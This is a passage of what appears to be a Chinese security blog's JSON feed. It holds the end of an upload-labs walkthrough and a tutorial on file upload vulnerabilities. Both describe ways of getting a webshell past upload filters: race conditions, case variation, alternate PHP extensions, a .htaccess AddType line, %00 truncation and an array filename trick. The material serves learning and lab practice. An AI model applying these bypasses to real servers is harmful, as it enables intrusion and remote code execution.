class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">2</span>);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;order) &#123;<br>                <span class=\"hljs-variable\">$short</span> = (ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">1</span>]) &lt;&lt; <span class=\"hljs-number\">8</span>) + ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                <span class=\"hljs-variable\">$short</span> = (ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">0</span>]) &lt;&lt; <span class=\"hljs-number\">8</span>) + ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">1</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$short</span>;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eof</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">return</span> !<span class=\"hljs-keyword\">$this</span>-&gt;binData||(strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData) === <span class=\"hljs-number\">0</span>);<br>        &#125;<br>    &#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"Less-17\"><a href=\"#Less-17\" class=\"headerlink\" title=\"Less-17\"></a>Less-17</h1><p>这一关考察条件竞争，看源码发现是先保存然后再判断是否需要删除，也就是可以一边不断发包上传，一边不断请求执行。上传一个执行就会额外生成木马的木马，抓住判断是否需要删除的一小段时间来发起请求，达到目的。我跑了一万次才有一次访问成功，还是要靠运气。。。。</p>\n<h1 id=\"Less-18\"><a href=\"#Less-18\" class=\"headerlink\" title=\"Less-18\"></a>Less-18</h1><p>同样也是条件竞争</p>\n<h1 id=\"Less-19\"><a href=\"#Less-19\" class=\"headerlink\" title=\"Less-19\"></a>Less-19</h1><p>WP说是可以%00截断1.php%00.jpg或者保存名为1.php/.    但是我发现好像可以大小写绕过？试了一下成功了嘻嘻嘻</p>\n<h1 id=\"Less-20\"><a href=\"#Less-20\" class=\"headerlink\" title=\"Less-20\"></a>Less-20</h1><p>审计代码，1.检查MIME类型 2. 检查文件名，如果是字符串，就直接通过.打散然后取出后缀，因此可以通过上传数组绕过处理，然后上传一个数量为三的数组，最后一个元素放jpg，第一个元素是1.php，中间的元素为空，这样绕过判断最后一个元素是不是jpg，同时拼接出来的文件名是<code>1.php.</code>，达到效果。</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/09/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "url": "http://blog.m1n.me/2019/09/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "title": "文件上传漏洞",
            "date_published": "2019-09-10T09:01:12.000Z",
            "content_html": "<h2 id=\"文件上传漏洞简介\"><a href=\"#文件上传漏洞简介\" class=\"headerlink\" title=\"文件上传漏洞简介\"></a>文件上传漏洞简介</h2><p>文件上传漏洞是web安全中经常遇到的一种漏洞形式，文件上传漏洞就是利用可以上传文件的地方将恶意代码或文件植入到服务器中，再通过URL去访问来执行代码，但是经常会遇到各种限制和过滤，因此就要学会各种姿势来绕过。</p>\n<span id=\"more\"></span>\n<h2 id=\"常见的限制以及绕过\"><a href=\"#常见的限制以及绕过\" class=\"headerlink\" title=\"常见的限制以及绕过\"></a>常见的限制以及绕过</h2><h3 id=\"客户端验证（前端验证\"><a href=\"#客户端验证（前端验证\" class=\"headerlink\" title=\"客户端验证（前端验证)\"></a>客户端验证（前端验证)</h3><h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>就是通过前端代码来检查用户所上传的文件的扩展名，对于攻击者来说是极其容易绕过的，因此更多是用于防止用户错误上传文件类型的措施。</p>\n<h4 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h4><ol>\n<li>先上传一个.gif或者.JPG之类的木马，突破前端验证后再通过抓包修改文件后缀名来实现绕过</li>\n<li>通过禁用或者删除JS来实现突破<h3 id=\"服务端验证\"><a href=\"#服务端验证\" class=\"headerlink\" title=\"服务端验证\"></a>服务端验证</h3><h4 id=\"MIME类型检测\"><a href=\"#MIME类型检测\" class=\"headerlink\" title=\"MIME类型检测\"></a>MIME类型检测</h4><h5 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h5>服务端通过检测MIME来限制文件上传的类型，其代码可能如下：<br><code>$_FILES[&#39;flie&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;</code><h5 id=\"绕过-1\"><a href=\"#绕过-1\" class=\"headerlink\" title=\"绕过\"></a>绕过</h5>通过抓包修改Content-Type<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.jpg\" alt=\"1.png\"><h4 id=\"检查文件内容\"><a href=\"#检查文件内容\" class=\"headerlink\" title=\"检查文件内容\"></a>检查文件内容</h4><h5 id=\"原理-2\"><a href=\"#原理-2\" class=\"headerlink\" title=\"原理\"></a>原理</h5>检查文件内容是否包含“&lt;? ”、“&lt;?= ”之类的关键字<h5 id=\"绕过-2\"><a href=\"#绕过-2\" class=\"headerlink\" title=\"绕过\"></a>绕过</h5>可以使用短tag绕过，例如<br><code>&lt;script language=&#39;pHp&#39;&gt;phpinfo();&lt;/script&gt;</code><h4 id=\"检查文件名\"><a href=\"#检查文件名\" class=\"headerlink\" title=\"检查文件名\"></a>检查文件名</h4><h5 id=\"原理-3\"><a href=\"#原理-3\" class=\"headerlink\" title=\"原理\"></a>原理</h5>检查文件名是否包含.php<h5 id=\"绕过-3\"><a href=\"#绕过-3\" class=\"headerlink\" title=\"绕过\"></a>绕过</h5></li>\n<li>大小写绕过，如.PhP</li>\n<li>使用其他可能被APache解析的后缀，如（.php4/.php5/.php7/.pht/.phtml）</li>\n<li>在Apache环境下上传.htaccess文件使其它后缀也被解析为php脚本执行。.htaccess文件内容为：<br><code>AddType application/x-http-php .jpg </code></li>\n<li>%00截断，操作方法：上传shell.jpg，Burp抓包，将文件名改为shell.php%00.jpg，选中%00，进行url-decode。</li>\n</ol>\n",
            "tags": []
        }
    ]
}